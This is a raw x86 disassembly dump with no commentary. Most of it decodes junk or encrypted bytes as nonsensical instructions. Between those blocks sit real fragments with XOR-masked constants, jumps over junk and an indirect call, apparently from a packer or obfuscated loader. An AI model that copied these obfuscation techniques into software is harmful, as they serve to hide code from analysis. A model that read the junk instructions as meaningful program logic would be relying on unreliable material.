  40d7c7:	cmp    BYTE PTR [ebp-0x5f6d91f5],dh
  40d7cd:	int3   
  40d7ce:	jge    0x40d7bf
  40d7d0:	(bad)  
  40d7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d2:	test   eax,0x9c735d2a
  40d7d7:	mov    WORD PTR [ecx],ds
  40d7d9:	and    BYTE PTR [eax+0x3],0xf6
  40d7dd:	inc    eax
  40d7de:	xor    BYTE PTR [esi],cl
  40d7e0:	repz adc DWORD PTR [eax+0x7f],ebp
  40d7e4:	push   eax
  40d7e5:	mov    eax,ds:0x2391b8b5
  40d7ea:	ja     0x40d81d
  40d7ec:	fadd   DWORD PTR [esp+edi*4+0x0]
  40d7f0:	les    ebx,FWORD PTR [edi-0x2d553c1c]
  40d7f6:	sub    DWORD PTR [esi-0x7fb1ff85],0xf9da9214
  40d800:	sub    DWORD PTR [ebp-0x1],eax
  40d803:	sahf   
  40d804:	js     0x40d842
  40d806:	xchg   ebx,eax
  40d807:	add    eax,0xb87c6554
  40d80c:	pop    esi
  40d80d:	xchg   esp,eax
  40d80e:	fistp  WORD PTR [edx-0x27]
  40d811:	nop
  40d812:	sbb    eax,0xbea5fbf4
  40d817:	inc    ecx
  40d818:	mov    eax,ds:0x356854d4
  40d81d:	pop    eax
  40d81e:	pop    esi
  40d81f:	inc    BYTE PTR [esi]
  40d821:	xor    al,dl
  40d823:	push   cs
  40d824:	ins    DWORD PTR es:[edi],dx
  40d825:	in     eax,0x12
  40d827:	adc    BYTE PTR [eax+0x1d],al
  40d82a:	inc    ebp
  40d82b:	xor    eax,0x35fbaaba
  40d830:	cdq    
  40d831:	jbe    0x40d8ad
  40d833:	cmp    DWORD PTR [esi+0x16],ebp
  40d836:	imul   ecx,DWORD PTR [ecx],0x6c68abaa
  40d83c:	ja     0x40d89b
  40d83e:	aam    0xd6
  40d840:	cs push edi
  40d842:	jnp    0x40d7d9
  40d844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d845:	mov    ebp,0x279c3d7c
  40d84a:	mov    ah,0xa
  40d84c:	lods   eax,DWORD PTR ds:[esi]
  40d84d:	add    ah,dl
  40d84f:	sbb    BYTE PTR [ebx-0x3e],0x64
  40d853:	dec    eax
  40d854:	repz inc ebx
  40d856:	mov    DWORD PTR cs:[esi-0x3fd201ea],eax
  40d85d:	mov    WORD PTR [ecx+0x6a],ds
  40d860:	add    eax,0xcb875b49
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	push   ebx
  40d879:	adc    BYTE PTR [ebx-0x9],cl
  40d87c:	sub    DWORD PTR [edx+0x7f227e7e],ecx
  40d882:	jle    0x40d902
  40d884:	iret   
  40d885:	fcom   DWORD PTR [ecx-0x1f8024a9]
  40d88b:	xchg   edx,eax
  40d88c:	cmp    DWORD PTR [eax-0x47],ecx
  40d88f:	sbb    bl,BYTE PTR [eax]
  40d891:	xor    DWORD PTR [esi-0x36af358f],eax
  40d897:	or     eax,edx
  40d899:	mov    esi,0xcda4c83e
  40d89e:	cs jb  0x40d8e2
  40d8a1:	lods   eax,DWORD PTR ds:[esi]
  40d8a2:	dec    esi
  40d8a3:	sbb    DWORD PTR [edx],esi
  40d8a5:	inc    esi
  40d8a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a7:	jne    0x40d8fc
  40d8a9:	into   
  40d8aa:	aam    0xd3
  40d8ac:	mov    edi,0x98a5f845
  40d8b1:	gs leave 
  40d8b3:	sbb    al,0xd6
  40d8b5:	int3   
  40d8b6:	push   es
  40d8b7:	std    
  40d8b8:	push   edx
  40d8b9:	aaa    
  40d8ba:	sbb    al,0x2
  40d8bc:	enter  0x2270,0xb4
  40d8c0:	outs   dx,BYTE PTR ds:[esi]
  40d8c1:	iret   
  40d8c2:	inc    edi
  40d8c4:	sbb    DWORD PTR [ecx],ebp
  40d8c6:	sbb    bh,BYTE PTR [ebp-0x6e]
  40d8c9:	sub    BYTE PTR [ebp-0x6f],bh
  40d8cc:	das    
  40d8cd:	retf   0xfd9a
  40d8d0:	add    bh,BYTE PTR [esi-0x78]
  40d8d3:	mov    ss,edi
  40d8d5:	imul   bp,dx,0xb8df
  40d8da:	clc    
  40d8db:	pop    ss
  40d8dc:	push   edi
  40d8dd:	pop    edi
  40d8de:	mov    ecx,0xbc73d9dc
  40d8e3:	xchg   edi,eax
  40d8e4:	stc    
  40d8e5:	xlat   BYTE PTR ds:[ebx]
  40d8e6:	out    0x43,eax
  40d8e8:	into   
  40d8e9:	aaa    
  40d8ea:	or     BYTE PTR [ebx-0x71],cl
  40d8ed:	stos   BYTE PTR es:[edi],al
  40d8ee:	test   BYTE PTR [edi+ebp*4-0x4b],ch
  40d8f2:	mov    dl,BYTE PTR [ebx-0x2944e7df]
  40d8f8:	stc    
  40d8f9:	inc    ebx
  40d8fa:	stc    
  40d8fb:	lock mov ah,0x6f
  40d8fe:	pop    es
  40d8ff:	push   cs
  40d900:	jno    0x40d88e
  40d902:	mov    bl,BYTE PTR [esp+eiz*2]
  40d905:	repnz xchg esi,eax
  40d907:	(bad)
  40d90c:	aas    
  40d90d:	pop    ebp
  40d90e:	ss jl  0x40d89e
  40d911:	sub    al,0xcf
  40d913:	mov    eax,ds:0xe7d00e5f
  40d918:	dec    esp
  40d919:	inc    eax
  40d91a:	dec    ecx
  40d91b:	mov    esi,0x7d1ba616
  40d920:	into   
  40d921:	ret    
  40d922:	lea    esp,[ebp+0x5e171143]
  40d928:	inc    esp
  40d929:	jp     0x40d947
  40d92b:	fcomi  st,st(7)
  40d92d:	add    ah,BYTE PTR [esi-0x3b523c51]
  40d933:	sbb    al,0xb0
  40d935:	repz xor al,0x54
  40d938:	test   ecx,eax
  40d93a:	jmp    0x40d9b2
  40d93c:	mov    es,WORD PTR [ebx+0x68997d71]
  40d942:	push   ss
  40d943:	jbe    0x40d992
  40d945:	cs stos DWORD PTR es:[edi],eax
  40d947:	xchg   ebp,eax
  40d948:	pop    ss
  40d949:	mov    edx,0x7651f26d
  40d94e:	or     al,0xe4
  40d951:	cli    
  40d952:	int    0xba
  40d954:	jno    0x40d95e
  40d956:	fwait
  40d957:	mov    ds:0x1b2e00e0,eax
  40d95c:	fptan  
  40d95e:	adc    BYTE PTR [esi],bl
  40d960:	xor    bh,BYTE PTR es:[ebx+0x452e8c7b]
  40d967:	fldcw  WORD PTR gs:[ecx-0x7]
  40d96b:	rcr    BYTE PTR [ecx+0x6c],0xd7
  40d96f:	jmp    0x2998:0x1dc78939
  40d976:	cdq    
  40d977:	data16 or ah,BYTE PTR [esi-0x27]
  40d97b:	outs   dx,BYTE PTR ds:[esi]
  40d97c:	sbb    ch,BYTE PTR [edx]
  40d97e:	mov    edx,0xa316531f
  40d983:	cmp    dl,BYTE PTR [edi+0x7a]
  40d986:	inc    ebx
  40d987:	pop    es
  40d988:	cmc    
  40d989:	mov    edi,0xadba7785
  40d98e:	push   es
  40d98f:	or     eax,DWORD PTR [edx+0x64]
  40d992:	push   ebx
  40d993:	adc    dl,BYTE PTR [esi+edi*8+0x40555eea]
  40d99a:	call   0x2fd602c7
  40d99f:	mov    ds:0xb8a33dae,al
  40d9a4:	fwait
  40d9a5:	jb     0x40da22
  40d9a7:	jbe    0x40d9a3
  40d9a9:	js     0x40d991
  40d9ab:	push   edx
  40d9ac:	addr16 in al,0x91
  40d9af:	push   esi
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	dec    ebx
  40d9c4:	mov    ebx,0x8bdd3876
  40d9c9:	jle    0x40da49
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40d9ea
  40d9d0:	cld    
  40d9d1:	pop    es
  40d9d2:	sbb    ecx,DWORD PTR [esi]
  40d9d4:	idiv   al
  40d9d6:	or     eax,0xdecc47ca
  40d9db:	jg     0x40d978
  40d9dd:	test   al,0x11
  40d9df:	(bad)  
  40d9e0:	sahf   
  40d9e1:	mov    bl,0x2d
  40d9e3:	pop    ecx
  40d9e4:	sub    DWORD PTR [edi+0x6adfde15],ecx
  40d9ea:	add    DWORD PTR [ecx],edi
  40d9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ed:	sub    dh,BYTE PTR [ebp+0x69785140]
  40d9f3:	les    esp,FWORD PTR [esi+0x66]
  40d9f6:	das    
  40d9f7:	mov    ch,0x56
  40d9f9:	test   BYTE PTR [edi+eiz*2+0x5b3395d],al
  40da00:	stc    
  40da01:	mov    cl,0x44
  40da03:	pop    ds
  40da04:	stos   BYTE PTR es:[edi],al
  40da05:	popf   
  40da06:	add    ebx,DWORD PTR [esi+0x3d]
  40da09:	sbb    eax,0xe87d9900
  40da0e:	push   ebp
  40da0f:	pop    ss
  40da10:	fs inc esp
  40da12:	jno    0x40d9bf
  40da14:	sahf   
  40da15:	pop    edx
  40da16:	sbb    DWORD PTR [esi+0x7f],0xffffff96
  40da1a:	test   BYTE PTR [ebx-0x1b40491e],0x1a
  40da21:	jb     0x40d9b3
  40da23:	mov    WORD PTR [ecx+0x37],gs
  40da26:	jo     0x40da13
  40da28:	imul   ecx,DWORD PTR [ebx-0x9b53eac],0xf0f8dd42
  40da32:	jge    0x40d9eb
  40da34:	sub    esi,edx
  40da36:	push   0x35
  40da38:	xchg   ebp,eax
  40da39:	adc    al,0xfd
  40da3b:	adc    BYTE PTR ds:0xd147aeaf,bl
  40da41:	jmp    0x718c:0xcebcf2f7
  40da48:	xlat   BYTE PTR ds:[ebx]
  40da49:	jp     0x40d9f3
  40da4b:	popf   
  40da4c:	jl     0x40da58
  40da4e:	(bad)  
  40da4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da50:	fidiv  DWORD PTR [ecx-0x245d4ae8]
  40da56:	add    bh,cl
  40da58:	not    BYTE PTR [eax-0x2a]
  40da5b:	cmp    BYTE PTR [eax+0x51],dh
  40da5e:	add    al,0x36
  40da60:	test   al,0xff
  40da62:	mov    ah,0x57
  40da64:	shr    DWORD PTR [ecx-0x26476d5b],1
  40da6a:	sbb    ebp,DWORD PTR [esi]
  40da6c:	push   edi
  40da6d:	xchg   esi,eax
  40da6e:	mov    al,0xb2
  40da70:	stos   BYTE PTR es:[edi],al
  40da71:	inc    ebx
  40da72:	(bad)  
  40da73:	cs adc dl,ch
  40da76:	sbb    dh,BYTE PTR [esi-0x4d089cc8]
  40da7c:	sbb    dh,0x8c
  40da7f:	bound  esi,QWORD PTR [eax+0x61cc701b]
  40da85:	xchg   esp,eax
  40da86:	stos   BYTE PTR es:[edi],al
  40da87:	int3   
  40da88:	add    eax,0xbac32cfc
  40da8d:	je     0x40da4e
  40da8f:	push   ebx
  40da90:	add    al,0xeb
  40da92:	fcmovbe st,st(5)
  40da94:	xchg   ebp,eax
  40da95:	in     al,dx
  40da96:	cmp    ebx,DWORD PTR [edx-0x2b]
  40da99:	inc    ebx
  40da9a:	call   0x125d1077
  40da9f:	xchg   ecx,eax
  40daa0:	sbb    ch,ah
  40daa2:	mov    esi,0x8ee54f4d
  40daa7:	xchg   ecx,eax
  40daa8:	mov    eax,ds:0xe19b7e3d
  40daad:	std    
  40daae:	xchg   esi,eax
  40daaf:	sbb    eax,0x14a2c621
  40dab4:	popa   
  40dab5:	mov    edx,0xb685fbb2
  40daba:	popa   
  40dabb:	and    esp,DWORD PTR [edi-0x30]
  40dabe:	mov    ebx,0xc7bf7be1
  40dac3:	rcl    BYTE PTR [esp+ebp*8-0x5b4b796e],cl
  40daca:	adc    ebp,ebp
  40dacc:	iret   
  40dacd:	or     al,0x67
  40dacf:	lea    eax,[edi+eiz*2+0x4a]
  40dad3:	and    DWORD PTR [ebp+0x14be3432],esi
  40dad9:	dec    edi
  40dada:	pop    eax
  40dadb:	add    BYTE PTR [eax],dh
  40dadd:	sbb    al,0xa2
  40dadf:	mov    edi,eax
  40dae1:	push   ebp
  40dae2:	add    esp,0xffffffc7
  40dae5:	test   eax,ebx
  40dae7:	jns    0x40db3a
  40dae9:	push   edx
  40daea:	sbb    DWORD PTR [edi+0x52fb7a72],edx
  40daf0:	xor    DWORD PTR [ecx],0xffffff96
  40daf3:	adc    eax,0xfbeb84ca
  40daf8:	mov    esi,0x8b49cbb8
  40dafd:	inc    ebp
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x4cb6fdf0
  40db32:	inc    esi
  40db33:	stos   DWORD PTR es:[edi],eax
  40db34:	into   
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0xed587e7e
  40db3f:	dec    ebx
  40db40:	inc    esi
  40db41:	xchg   esp,eax
  40db42:	(bad)  
  40db43:	iret   
  40db44:	jmp    0x9a8181af
  40db49:	mov    ebp,0x4f0afb38
  40db4e:	test   al,0x2d
  40db50:	repnz inc esi
  40db52:	jae    0x40dbba
  40db54:	rol    ebx,1
  40db56:	rol    DWORD PTR [ebp+0x6b],0x3f
  40db5a:	sbb    ebp,DWORD PTR [edi-0x49e1d353]
  40db60:	inc    edx
  40db61:	or     eax,0x74666d2f
  40db66:	jbe    0x40dbdf
  40db68:	es dec edx
  40db6a:	or     eax,0xae2b24f2
  40db6f:	lahf   
  40db70:	jg     0x40db4b
  40db72:	test   BYTE PTR [bx+si-0x6],bh
  40db76:	call   0xdce:0xaf6bd43b
  40db7d:	out    0x30,al
  40db7f:	pop    eax
  40db80:	test   eax,0x61485252
  40db85:	pop    es
  40db86:	xor    bl,ah
  40db88:	xchg   esi,eax
  40db89:	push   ebx
  40db8a:	ret    
  40db8b:	mov    DWORD PTR [ebp+0x1e],esi
  40db8e:	or     ah,bl
  40db90:	mov    esp,0x7ca859d9
  40db95:	xor    BYTE PTR ds:0x38a9a6d2,bl
  40db9b:	fucom  st(2)
  40db9d:	jge    0x40db8a
  40db9f:	arpl   WORD PTR [esi+ecx*1+0x35ced684],cx
  40dba6:	sbb    eax,0xb4d6fe9d
  40dbab:	adc    ebp,eax
  40dbad:	cmp    DWORD PTR [esi],0x4e
  40dbb0:	cmp    eax,0x424b265d
  40dbb5:	xor    edx,DWORD PTR [ebx+0x7ec9b668]
  40dbbb:	cli    
  40dbbc:	and    DWORD PTR [esp+ecx*8-0x5b],ebx
  40dbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbc1:	cmp    cl,bl
  40dbc3:	les    esi,FWORD PTR [ebx]
  40dbc5:	sub    BYTE PTR [eax-0x4e50a62],0xaf
  40dbcc:	mov    ch,0x81
  40dbce:	out    dx,al
  40dbcf:	pop    esi
  40dbd0:	add    DWORD PTR [edi+0xf8b07b4],ebp
  40dbd6:	mov    ds:0x67ad201a,eax
  40dbdb:	xchg   edx,eax
  40dbdc:	or     eax,0x86ccf06
  40dbe1:	adc    al,0xe3
  40dbe3:	xor    DWORD PTR [eax+ebp*8-0x4d3a0385],esp
  40dbea:	ficomp WORD PTR [esp+edx*1]
  40dbed:	sbb    eax,0xd1c5a369
  40dbf2:	push   cs
  40dbf3:	cmp    BYTE PTR [edx-0x77],ch
  40dbf6:	jl     0x40dc71
  40dbf8:	pop    eax
  40dbf9:	dec    ecx
  40dbfa:	icebp  
  40dbfb:	sti    
  40dbfc:	or     dh,BYTE PTR [esi-0x1e]
  40dbff:	ret    0xce2d
  40dc02:	sub    BYTE PTR [edx-0x3d],bl
  40dc05:	lds    ebx,FWORD PTR [ecx-0xde0534]
  40dc0b:	jmp    0x786774c
  40dc10:	popf   
  40dc11:	dec    eax
  40dc12:	mov    esp,DWORD PTR [ecx]
  40dc14:	push   0xffffff9f
  40dc16:	hlt    
  40dc17:	inc    esi
  40dc18:	pusha  
  40dc19:	jg     0x40dc8f
  40dc1b:	push   ebx
  40dc1c:	mov    eax,ds:0xda4d801c
  40dc21:	(bad)  
  40dc22:	cmp    al,0x0
  40dc24:	jmp    0xdd4e:0x46831ad
  40dc2b:	imul   esp,ebx,0x30e13225
  40dc31:	xchg   edx,eax
  40dc32:	lahf   
  40dc33:	adc    dl,BYTE PTR [eax-0x460ada67]
  40dc39:	std    
  40dc3a:	xchg   ebx,edx
  40dc3c:	(bad)  
  40dc3d:	scas   al,BYTE PTR es:[edi]
  40dc3e:	(bad)  
  40dc3f:	mov    eax,ds:0x4768bd40
  40dc44:	imul   ebp,DWORD PTR [ecx],0xe922f043
  40dc4a:	cmp    cl,BYTE PTR [eax]
  40dc4c:	test   BYTE PTR [ebp-0x3bf4ab09],ah
  40dc52:	popf   
  40dc53:	push   0x7072ccd8
  40dc58:	fst    DWORD PTR [eax-0xd975cb]
  40dc5e:	sub    DWORD PTR [edi-0x731b8d05],0xffffffaf
  40dc65:	ins    DWORD PTR es:[edi],dx
  40dc66:	push   esi
  40dc67:	aad    0x9e
  40dc69:	add    eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	mov    eax,ds:0xb5f2de07
  40dce1:	mov    DWORD PTR [esi+0x7e],edi
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dcd2
  40dce9:	inc    ebx
  40dcea:	gs and dl,dl
  40dced:	sub    bl,BYTE PTR [eax]
  40dcef:	aam    0x71
  40dcf1:	lods   eax,DWORD PTR ds:[esi]
  40dcf2:	iret   
  40dcf3:	lahf   
  40dcf4:	lahf   
  40dcf5:	sub    al,0x4a
  40dcf7:	mov    WORD PTR [ebx+0x795bddaf],es
  40dcfd:	sti    
  40dcfe:	xchg   esp,eax
  40dcff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd00:	call   0xd9c3:0xeb814857
  40dd07:	xor    al,0xfe
  40dd09:	lea    eax,[eax+0x237b4425]
  40dd0f:	jg     0x40dcc9
  40dd11:	mov    eax,0xcb9ffc8c
  40dd16:	mov    ecx,DWORD PTR [ebx]
  40dd18:	inc    ebx
  40dd19:	mov    bx,0x6b89
  40dd1d:	out    dx,al
  40dd1e:	push   0x32475efa
  40dd23:	inc    esp
  40dd24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd25:	icebp  
  40dd26:	mov    ebx,0x17d858bd
  40dd2b:	outs   dx,BYTE PTR ds:[esi]
  40dd2c:	push   cs
  40dd2d:	test   DWORD PTR [eax-0x116e5b39],ecx
  40dd33:	lods   eax,DWORD PTR ds:[esi]
  40dd34:	and    DWORD PTR [ebx-0xc],eax
  40dd37:	loopne 0x40ddb7
  40dd39:	push   edx
  40dd3a:	jp     0x40dd94
  40dd3c:	aad    0xa9
  40dd3e:	mov    WORD PTR [eax-0x451ff2b4],cs
  40dd44:	aad    0x3f
  40dd46:	cmc    
  40dd47:	xchg   ecx,eax
  40dd49:	mov    al,0x2a
  40dd4b:	fsubr  st,st(7)
  40dd4d:	inc    eax
  40dd4e:	in     eax,0x97
  40dd50:	leave  
  40dd51:	or     eax,0x7012064a
  40dd56:	inc    ecx
  40dd57:	outs   dx,DWORD PTR ds:[esi]
  40dd58:	(bad)  
  40dd59:	shl    BYTE PTR [ebp-0x20],cl
  40dd5c:	cs sub dl,bl
  40dd5f:	addr16 xor edi,esp
  40dd62:	shl    DWORD PTR [edx-0x23],cl
  40dd65:	sbb    DWORD PTR [ebp+0xa8c99d6],ebp
  40dd6b:	cmp    eax,0x1a0a26f6
  40dd70:	daa    
  40dd71:	mov    BYTE PTR [ecx+0x67],cl
  40dd74:	mov    ebp,0x9ef7e0e1
  40dd79:	adc    ebx,DWORD PTR [ebx]
  40dd7b:	mov    dh,0xd0
  40dd7d:	out    dx,al
  40dd7e:	push   0xf43a619
  40dd83:	dec    eax
  40dd84:	fs cmp eax,esp
  40dd87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd88:	and    eax,0x3cf8cec7
  40dd8d:	bound  edx,QWORD PTR [edi]
  40dd8f:	mov    esp,edi
  40dd91:	sti    
  40dd92:	cmp    al,0x65
  40dd94:	add    BYTE PTR [edi-0x45813da2],cl
  40dd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd9b:	adc    al,0xf6
  40dd9d:	or     BYTE PTR ds:0xf6e4dd0d,0xb5
  40dda4:	aas    
  40dda5:	call   0x49f3:0x470b04c0
  40ddac:	setp   BYTE PTR [eax]
  40ddaf:	in     eax,dx
  40ddb0:	add    dh,ch
  40ddb2:	xlat   BYTE PTR ds:[ebx]
  40ddb3:	cmp    al,0x7d
  40ddb5:	pop    esi
  40ddb6:	dec    ebx
  40ddb7:	hlt    
  40ddb8:	pop    esi
  40ddb9:	add    ah,BYTE PTR [edi+0x4f9d1d75]
  40ddbf:	inc    ebp
  40ddc0:	jmp    0xd9ba:0x37aa6141
  40ddc7:	push   cs
  40ddc8:	scas   eax,DWORD PTR es:[edi]
  40ddc9:	or     al,0x55
  40ddcb:	pusha  
  40ddcc:	je     0x40ddfd
  40ddce:	sar    BYTE PTR [edi],0xb9
  40ddd1:	gs mov edx,0x1042926b
  40ddd7:	mov    edi,0xa16b5a14
  40dddc:	bound  eax,QWORD PTR [edi]
  40ddde:	cmp    DWORD PTR [ebx],ebx
  40dde0:	adc    bl,ah
  40dde2:	dec    edi
  40dde3:	imul   ebx,DWORD PTR [eax+0x1b],0x2d
  40dde7:	das    
  40dde8:	inc    ebp
  40dde9:	jno    0x40dda9
  40ddeb:	sti    
  40ddec:	cmc    
  40dded:	or     eax,0xe50a0290
  40ddf2:	(bad)  
  40ddf3:	sti    
  40ddf4:	iret   
  40ddf5:	sbb    eax,edi
  40ddf7:	scas   eax,DWORD PTR es:[edi]
  40ddf8:	dec    ebx
  40ddf9:	pushf  
  40ddfa:	ja     0x40de07
  40ddfc:	xor    BYTE PTR [eax-0x61c3e68],ch
  40de02:	ror    dh,cl
  40de04:	nop
  40de05:	and    ah,ch
  40de07:	pop    ebx
  40de08:	cwde   
  40de09:	xchg   DWORD PTR [ebx],esp
  40de0b:	cmp    DWORD PTR [ebx],ebp
  40de0d:	iret   
  40de0e:	xchg   ecx,eax
  40de0f:	repnz sub al,0x5a
  40de12:	push   ds
  40de13:	sub    DWORD PTR [ecx+0x458b0845],ecx
  40de19:	call   0x335533a9
  40de1e:	rol    DWORD PTR [ebx],0xc6
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx-0x2165632b],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40de4e
  40de8e:	popa   
  40de8f:	scas   eax,DWORD PTR es:[edi]
  40de90:	iret   
  40de91:	jb     0x40deef
  40de93:	jbe    0x40de78
  40de95:	xchg   edx,eax
  40de96:	std    
  40de97:	sbb    ebp,DWORD PTR [edx-0x1a]
  40de9a:	jecxz  0x40dee5
  40de9c:	sbb    al,0xdc
  40de9e:	sub    eax,0x3a0256d0
  40dea3:	or     bl,bh
  40dea5:	out    dx,al
  40dea6:	int3   
  40dea7:	mov    DWORD PTR [ebx+0x61],ebp
  40deaa:	sub    eax,0x8df80a0b
  40deaf:	push   edi
  40deb0:	mov    cl,0x57
  40deb2:	xchg   edi,eax
  40deb3:	sbb    eax,0x5ad1a464
  40deb8:	jno    0x40de7f
  40deba:	ds jo  0x40de5b
  40debd:	and    esi,DWORD PTR [eax+0x57]
  40dec0:	jmp    0x40deb5
  40dec2:	nop
  40dec3:	lods   eax,DWORD PTR ds:[esi]
  40dec4:	sub    DWORD PTR [edx],ecx
  40dec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec7:	(bad)  
  40dec8:	xchg   esp,eax
  40dec9:	push   es
  40deca:	mov    dh,al
  40decc:	sahf   
  40decd:	icebp  
  40dece:	inc    eax
  40decf:	test   DWORD PTR [ebx],eax
  40ded1:	pop    edx
  40ded2:	mov    edi,0xa7a23056
  40ded7:	add    esi,esi
  40ded9:	inc    ecx
  40deda:	dec    eax
  40dedb:	ror    bl,1
  40dedd:	push   eax
  40dede:	adc    ebp,edi
  40dee0:	sub    BYTE PTR [ebp+0x78],ch
  40dee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee4:	jmp    0x40de7f
  40dee6:	jg     0x40ded0
  40dee8:	lahf   
  40dee9:	call   0x9732:0x580121d8
  40def0:	fsubr  st(4),st
  40def2:	rol    ebp,0xb5
  40def5:	retf   
  40def6:	stos   BYTE PTR es:[edi],al
  40def7:	pop    ecx
  40def8:	std    
  40def9:	mov    ch,0x11
  40defb:	and    BYTE PTR [esi],ah
  40defd:	ja     0x40df75
  40deff:	loop   0x40df02
  40df01:	xchg   ebx,eax
  40df02:	popa   
  40df03:	sbb    bh,dl
  40df05:	mov    ebx,0x8543f8c3
  40df0a:	sbb    eax,0x4401751c
  40df0f:	cmp    DWORD PTR [edi-0x38e0a2a8],0x520c43a3
  40df19:	pop    esp
  40df1a:	dec    BYTE PTR [eax]
  40df1c:	add    DWORD PTR [eax],edx
  40df1e:	sub    DWORD PTR [ebp+edx*4-0x19],0xffffffa8
  40df23:	add    bl,BYTE PTR es:[esp+esi*4+0x53236059]
  40df2b:	idiv   DWORD PTR [eax+0x75]
  40df2e:	cdq    
  40df2f:	test   DWORD PTR [ebp+ebx*4+0x6abf4747],esp
  40df36:	ja     0x40df4e
  40df38:	jne    0x40dec8
  40df3a:	jg     0x40df8c
  40df3c:	cli    
  40df3d:	jg     0x40df14
  40df3f:	ss stc 
  40df41:	clc    
  40df42:	(bad)  
  40df44:	or     esp,DWORD PTR [eax+0x5c]
  40df47:	jno    0x40df4c
  40df49:	je     0x40df4b
  40df4b:	and    ecx,DWORD PTR [edx-0x35]
  40df4e:	shl    BYTE PTR [eax],cl
  40df50:	xlat   BYTE PTR ds:[ebx]
  40df51:	ret    0x6f05
  40df54:	paddb  mm6,QWORD PTR cs:[eax-0x35]
  40df59:	jmp    0x1e1b:0xba22a932
  40df60:	mov    edx,0xf803433a
  40df65:	(bad)  
